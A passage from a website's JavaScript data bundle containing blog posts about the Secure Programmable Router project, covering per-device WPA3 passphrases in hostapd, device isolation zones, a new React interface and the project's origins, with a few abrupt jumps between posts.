chaining"},"nextItem":{"title":"Gigabit WiFi with SPR & The 4x4 MT7915","permalink":"/pages/blog/wifi6"}},"content":"### SPR\'s WPA3 Multiple Passwords per SSID Surprises People\\n\\n WiFi nerds and people working on WiFi products have shared their surprise with me a few times now about the integration for multi-PSK with WPA3. This is something already mostly built into HostAP so it should be possible anywhere, although it is not obvious from the documentation. I\'m told that most other projects simply don\'t do it, putting SPR at the head of the pack! In this post I\'ll share how it\'s integrated, so that others can benefit from the ideas and improve WiFi security for people all around the world.\\n\\n### WPA3 Authentication is Fundamentally Different\\n\\nWPA3 authentication uses [Dragonfly](https://datatracker.ietf.org/doc/html/rfc7664), a Zero-Knowledge Proof in its Simulataneous Authentication of Equals Handshake protocol. With SAE there is nothing to sniff and crack offline from the key exchange. This is in contrast to WPA/WPA2 which is notorious for password cracking of weak passwords from captured handshakes -- or even more conteniently, by using the [RSN IE specification flaw](https://hashcat.net/forum/thread-7717.html).\\n\\nFor Multi-PSK, a router can go down the list of stored PSKs and try each key and see if it had a matching one.\\nFor WPA3, this is not possible. Authenticating a password requires an interactive zero knowledge proof, so a new handshake is required to try a different password.\\n\\n### SPR Uses HostAP\'s MAC Assignment\\n\\nPSKs are assigned by MAC address. HostAP finds the passphrase to use by MAC address to perform the authentication, using the correct PSK the first time around for the interactive proof.\\n\\nThe syntax for hostapd.conf to assign multiple devices is as follows:\\n```\\nsae_password=1stPassphraseHere|mac=01:23:45:67:89:aa\\nsae_password=2ndPassphraseHere|mac=01:23:45:67:89:ab\\n```\\n\\n### Adding Device is Seamless\\n\\nAdding devices is an easy process. If a user does know a MAC address, they can certainly\\nspecify the MAC address ahead of time. However, SPR can use a wildcard MAC to match a new\\nincoming device.

One mini pci-e slot is dedicated to [mSATA](https://en.wikipedia.org/wiki/Serial_ATA#Mini-SATA_(mSATA)), and the other can be used to fit a wifi radio.

This means that it supports both 2Ghz and 5Ghz\\nfrequencies simultaneously. For our install the 2ghz interface is on `wlan0` and 5Ghz on `wlan1`. This is really wonderful, since one card can serve older IOT devices that only run on 2Ghz as well as more modern devices at high speeds.\\n\\nThe linux kernel driver is not yet as stable as it could be, so beware that it may not yet be production ready -- several assertions and crashes were noticed. The mainline kernel does not yet support radar scanning, however the code is available in the [openwrt development branch](https://github.com/openwrt/mt76)."},{"id":"UI Push","metadata":{"permalink":"/pages/blog/UI Push","source":"@site/blog/2022-01-19-min-ui.md","title":"Supernetworks just Released a React User Interface","description":"User Friendliness","date":"2022-01-19T00:00:00.000Z","formattedDate":"January 19, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"UI","permalink":"/pages/blog/tags/ui"},{"label":"React","permalink":"/pages/blog/tags/react"},{"label":"Golang","permalink":"/pages/blog/tags/golang"}],"readingTime":2.335,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"UI Push","title":"Supernetworks just Released a React User Interface","authors":"ltsrad","tags":["SPR","UI","React","Golang"]},"prevItem":{"title":"Running SPR on a Mini PC with WiFi 6","permalink":"/pages/blog/spr_mini_pc"},"nextItem":{"title":"Announcing The SPR Project","permalink":"/pages/blog/first-blog-post"}},"content":"## User Friendliness\\n\\nThe SPR project started out as a series of bash scripts and configuration files. Adding new devices\\nwas a little bit error prone, as everything was done on the command line. Each device would\\nrequire a new, strong password, and each device needed to be added to a zone\'s configuration.\\nNext, hostapd had to be restarted to get WPA3 password reloading to work. It was hard to debug and not apparent if things failed.\\n\\nWhat would make SPR super useful, though, would be if it was easy to use. And a user interface can do that for us.\\n\\nSo this week, Supernetworks pushed out a [frontend](https://github.com/spr-networks/super/tree/main/frontend) for testing.\\n\\n## This Release Delivers Basic UI Features\\n\\nThree functions are now available:\\n  - Add a new wireless device to the network\\n  - List devices\\n  - Set device access zones\\n\\nWhile these are simple things, and seemingly easy, SPR\'s services work together to build a network\\nthat is virtually unlike all other wifi setups available today. As a result, the base station service,\\nthe DHCP server, and the API need to work together to leverage their features so that users have\\na super smooth  experience.\\n\\n## See a Demo\\n\\n<div>\\n  <video width=\\"100%\\" height=\\"100%\\" playsInline muted controls src=\\"/pages/video/sprui.mp4\\" type=\\"video/mp4\\">\\n  </video>\\n</div>\\n\\n### How Devices are Connected to SPR\\n  * Each wireless device is on an isolated network, keyed in by their MAC address and passphrase\\n  * MAC/ARP spoofing is blocked by hardened firewall rules to completely stop ethernet/IP-based evasion for lateral movement\\n  * Zones specify the level of each individual device\'s access\\n  * Custom zones can create groups of devices that can intercommunicate without having full LAN access\\n  * Built in ad blocking with CoreDNS\\n\\n#### Some of the challenges were\\n  *  Laying down a solid foundation between the API and frontend to make adding new features great\\n  *  Supporting a smooth WPA3 experience, which uses a ZKP for authentication\\n  *  Making it fast and easy to add a device without having to also know or enter its MAC address ahead of time\\n\\n\\n## The Zones\\n\\nThe built in zones are\\n  - DNS for outbound DNS queries\\n  - WAN for outbound internet access\\n  - LAN for general access to all local devices\\n\\nWhen a user types in a new name, such as \\"Cameras\\",  NFTables verdict maps gets created\\nby the API.

In the future, custom firewall rules will be added\\nto further specify how the groups interact.\\n\\n## What\'s Next for the UI\\n\\nFor the road map, I\'m thinking about security features such as intrusion detection\\nor automated security scanning and fingerprinting, network debugging and bandwidth monitoring,\\nper-device ad blocking, and home automation."},{"id":"first-blog-post","metadata":{"permalink":"/pages/blog/first-blog-post","source":"@site/blog/2022-01-10-first-blog-post.md","title":"Announcing The SPR Project","description":"Hello, SPR","date":"2022-01-10T00:00:00.000Z","formattedDate":"January 10, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"Hello World","permalink":"/pages/blog/tags/hello-world"}],"readingTime":5.125,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"first-blog-post","title":"Announcing The SPR Project","authors":"ltsrad","tags":["SPR","Hello World"]},"prevItem":{"title":"Supernetworks just Released a React User Interface","permalink":"/pages/blog/UI Push"}},"content":"## Hello, SPR\\n\\nI\'m happy to start releasing the **Secure Programmable Router** project to the world. I\'ve been running my home WiFi\\nwith it for the past few months and I\'m beyond excited to give back to the open source community.\\nI started working on this project because I think that Linux provides a tremendous amount of agility and\\npower for secure home networking but I felt like there was no router project out there that pulled it all together.\\n\\n## The SPR project is about several things\\n\\n- A highly secure foundation to operate a home network where using the internet is safe and it\'s easy to see and control what IoT devices are up to when they are plugged in.\\n\\n- Making home privacy easy instead of begrudgingly sharing telemetry with big data companies.\\n\\n- Open source and empowering developers by lowering the barrier to entry for coding with home networking.\\n\\n- About reducing the barrier for entry.\\n\\n- Enabling scripting and rapid prototyping.\\n\\n- Adapting modern networking paradigms and tools that can meets today\'s needs.\\n\\n## How SPR Came To Be\\n\\nDuring the past year, I took a serious look at [opnsense](https://opnsense.org/) and [OpenWRT](https://openwrt.org/), and ordered over a dozen different wifi routers to set up my home network. I sat down and built and deployed my own OpenWRT images and to set up secure wifi networks to connect with a more serious firewall. What I found was that the setups I had managed to achieve were not only frustrating to manage, but when I went to test their security, I found time and time again that vendor wifi routers were insecure due to fundamental limitations with the network designs. On top of that, they were [riddled with software security holes](https://www.zerodayinitiative.com/blog/2021/11/1/pwn2ownaustin). Unfortunately, running the open source builds of OpenWRT often had degraded performance versus the proprietary vendor patches or required breaking secure boot.\\n\\nI felt frustrated because I felt like I had lost control over my own home network. I had only a basic idea of what I was running and what my devices were doing, let alone the routers themselves. Between smart bulbs and vacuum cleaners and home security cameras and speakers, TVs, gaming consoles, laptops, desktops, streaming devices, more routers, and work equipment, there was a lot of stuff that was online.\\n\\nI\'ve been working in computer security for over 15 years and I often get asked for how to set up a home network.\\n\\nThe best advice I could give people for their home wifi was to keep their mission critical systems on a dedicated wifi router, and plug that one into the main wifi router with all the other\\n\\"stuffs\\" that ultimately connects to the internet. This is awkward and requires switching networks or IGMP proxying to do discovery or zeroconf. This doesn\'t scale well across a multi-office home with repeaters and backhaul. It also doesn\'t scale well in an apartment where there\'s competition for radio bandwidth with neighbors for essentially one of only three coveted 80mhz channels on 5ghz.\\n\\nThe next best advice was to split out the \\"whatever\\" non-critical devices to the guest network, and the mission critical stuff on the main network. Hardening the guest network with isolation breaks discovery and streaming as well. In practice I found that most of the routers I looked at did not have good guest isolation anyway when enabled, something I will blog about later. No exploits are required, because more or less an attacker can just ask a router to send packets for them to work around hostapd\'s AP Isolation feature, and most of the routers will happily do what they do best, route the packets.\\n\\nAt the end of the day though, it\'s fundamentally a flawed idea to have a shared passphrase across many devices because that passphrase effectively lets devices spoof each other or attempt to intercept traffic, making it tough to truly firewall devices.\\n\\nSo then I started looking into enterprise wifi authentication: 802.1x  (EAP-PEAP, EAP-TLS, EAP-PWD). EAP-TLS really is the only secure way to do things since EAP-PEAP suffers from fundamental [man in the middle issues](https://datatracker.ietf.org/doc/html/draft-josefsson-pppext-eap-tls-eap-10#section-5.8) that were [never fixed](https://github.com/latelee/hostapd/commit/a190189d221aaef869ae2f52f7ead75b0c327995). Or EAP-PWD (which is almost wpa3) would be great,  if it was supported by more devices and drivers, and well with EAP-TLS, certificate management is pain.\\n\\nI really wished that one could just use a unique passphrase per device. Well, it turns out that yes, that works, and hostapd supports it out of the box. With some logic and [usability and correctness fixes](https://github.com/spr-networks/hostap/commit/279c5203e4c767701ac9fb7cf31624390437d854) to hostapd, and it was easy to seamlessly add new devices and their passphrases on the fly.\\n\\nOkay that was great. Next, I created strong device isolation with per-device subnets that could be configured to communicate with other subnets using forwarding rules. The resulting network was a bit too different than the spirit of the networking scripts in OpenWRT, and the patching became unreasonable to expect for upstream to accept, so I started from fresh ground.\\n\\nSPR is implemented for rapid iteration. Services are containerized so that developers can swap out core services or roll up new ones in a testable, reproducible manner. An API drives configuration to allow for customization. SPR Runs off of Ubuntu, with Docker containers, and manages the network with NFTables. It uses hostapd for the base station software, CoreDHCP for DHCP, CoreDNS for DNS, and supports Wireguard.\\n\\nSPR simply enables users to do better than today\'s status quo. It lets users run a hardened, secure network without restrictive drawbacks. It lets users connect their consumer electronics to the internet with the peace of mind that doing so does not weaken their home network security.\\n\\n## What\'s Next\\n\\nToday SPR runs as a proof of concept on a Raspberry Pi.  With a USB dongle it\'s well able to handle over a dozen wifi stations and serve data from the internet with rates up to 500mbps. Work is underway to expand to new systems.\\n\\nI\'m currently wrapping up a Web UI to make SPR user friendly. In the near future I\'ll be posting a road map for what\'s planned.\\n\\nWant to learn more and discuss? Join the [Discord Chat](https://discord.gg/WeNKMVTR)"}]}')}}]);
